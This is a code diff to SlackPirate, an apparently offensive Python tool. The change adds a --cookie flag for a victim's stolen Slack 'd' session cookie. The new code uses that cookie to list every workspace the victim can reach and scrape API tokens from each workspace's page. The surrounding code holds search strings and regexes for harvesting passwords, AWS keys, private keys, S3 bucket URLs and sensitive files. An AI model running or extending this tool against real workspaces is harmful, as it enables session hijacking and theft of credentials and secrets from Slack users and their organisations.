@@ -13,9 +13,20 @@ import termcolor
 colorama.init()  # Initialise the colorama module - this is used to print colourful messages - life's too dull otherwise
 
 parser = argparse.ArgumentParser()
-parser.add_argument('--token', type=str, required=True, help='Slack Token - will start with XOX')
+parser.add_argument('--token', type=str, required=False, help='Slack Workspace token - will start with XOX - this will allow you to query against a single Workspace')
+parser.add_argument('--cookie', type=str, required=False, help='Slack \'d\' cookie - this will allow you to see all Workspaces the victim has access to')
 args = parser.parse_args()
-token = args.token
+
+if args.cookie is None and args.token is None:
+    print(termcolor.colored("No arguments passed. Run SlackPirate.py --help ", "red"))
+    exit()
+elif args.cookie and args.token:
+    print(termcolor.colored("You cannot use both --cookie and --token flags at the same time", "red"))
+    exit()
+elif args.cookie and args.token is None:
+    d_cookie = dict(d=args.cookie)
+elif args.token and args.cookie is None:
+    token = args.token
 
 slack_workspace = ''
 output_directory = ''
@@ -26,19 +37,42 @@ file_credentials = "credentials.txt"
 file_aws = "aws-keys.txt"
 file_private_keys = "private-keys.txt"
 tier_2_rate_limit_counter = 1  # keeping track of number of requests so that we rate-limit before Slack does it for us
+
 s3_queries = ["s3.amazonaws.com", "s3://", "https://s3", "http://s3"]
 credentials_queries = ["password:", "password is"]
 aws_keys_queries = ["ASIA", "AKIA"]
 private_keys_queries = ["BEGIN RSA PRIVATE", "BEGIN OPENSSH PRIVATE", "BEGIN DSA PRIVATE", "BEGIN EC PRIVATE",
                         "BEGIN PGP PRIVATE"]
-interesting_files_queries = [".KEY", ".PEM", ".PPK", ".XLS", ".XLSX", ".DOC", ".DOCX", ".SH", ".SQL", "password", "secret"]
-
-
+interesting_files_queries = [".KEY", ".PEM", ".PPK", ".XLS", ".XLSX", ".DOC", ".DOCX", ".SH", ".SQL", "password",
+                             "secret"]
+already_signed_in_team_regex = r"already_signed_in_team\" href=\"([a-zA-Z0-9:./-]+)"  # https://regex101.com/r/9GRaem/1
+slack_api_token_regex = r"api_token: \"(xox[a-zA-Z]-[a-zA-Z0-9-]+)\""  # https://regex101.com/r/2Hz8AX/1
 workspace_valid_emails_regex = r"email-domains-formatted=\"(@.+?)[\"]"
 private_keys_regex = r"[-]+BEGIN [^\s]+ PRIVATE KEY[-]+[\s]*[^-]*[-]+END [^\s]+ PRIVATE KEY[-]+"  # https://regex101.com/r/jWrF8F/1
 s3_regex = r"[a-zA-Z0-9-\.\_]+\.s3\.amazonaws\.com|s3://[a-zA-Z0-9-\.\_]+|s3-[a-zA-Z0-9-\.\_\/]+|s3.amazonaws.com/[a-zA-Z0-9-\.\_]+|s3.console.aws.amazon.com/s3/buckets/[a-zA-Z0-9-\.\_]+"  # https://regex101.com/r/6bLaKj/7
 credentials_regex = r"[pP]assword\s*:\s*[^\s]+|password is\s*:\s*[^\s]+|password is\s*\"[^\s]+"  # https://regex101.com/r/xQz9JT/3
 aws_keys_regex = r"(?<![A-Za-z0-9/+=])[A-Za-z0-9/+=]{40}(?![A-Za-z0-9/+=])|(?<![A-Z0-9])[A-Z0-9]{20}(?![A-Z0-9])"  # https://regex101.com/r/IEq5nU/2
+
+
+def is_cookie_flag_set():
+    if args.cookie:
+        try:
+            r = requests.get("https://a.slack.com", cookies=d_cookie)
+            regex_results = re.findall(already_signed_in_team_regex, str(r.content))
+            if regex_results:
+                print(termcolor.colored("This cookie has access to the following Workspaces: \n", "blue"))
+                for workspace in regex_results:
+                    r = requests.get(workspace, cookies=d_cookie)
+                    regex_tokens = re.findall(slack_api_token_regex, str(r.content))
+                    for slack_token in regex_tokens:
+                        print(termcolor.colored("URL: " + workspace + " Token: " + slack_token, "green"))
+
+            else:
+                print(termcolor.colored("No workspaces were found for this cookie", "red"))
+                exit()
+        except requests.exceptions.RequestException as exception:
+            print(exception)
+        exit()
 
 
 def check_token_validity():
@@ -275,6 +309,8 @@ def download_interesting_files():
         termcolor.colored("Downloaded files (if any were found) will be found in: ./" + output_directory + "/downloads",
                           "blue"))
 
+
+is_cookie_flag_set()
 
 check_token_validity()
 
